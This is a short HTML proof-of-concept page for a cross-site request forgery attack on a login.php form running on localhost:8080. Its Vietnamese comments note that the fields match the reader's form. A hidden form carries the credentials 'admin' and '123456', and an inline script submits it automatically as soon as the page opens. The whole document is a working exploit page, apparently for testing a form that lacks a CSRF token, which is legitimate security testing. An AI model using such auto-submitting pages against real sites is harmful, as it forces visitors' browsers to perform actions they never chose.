<!doctype html>
<html>
<head>
  <meta charset="utf-8">
  <title>CSRF PoC -> login.php (no csrf_token)</title>
</head>
<body>
  <h3>CSRF PoC (no csrf_token) → submit to http://localhost:8080/login.php</h3>

  <form id="f" action="http://localhost:8080/login.php" method="POST">
    <!-- trường username/password giống form của bạn -->
    <input type="hidden" name="username" value="admin">
    <input type="hidden" name="password" value="123456">
    <input type="hidden" name="submit" value="submit">
  </form>

  <script>
    // submit tự động khi mở trang
    document.getElementById('f').submit();
  </script>
</body>
</html>
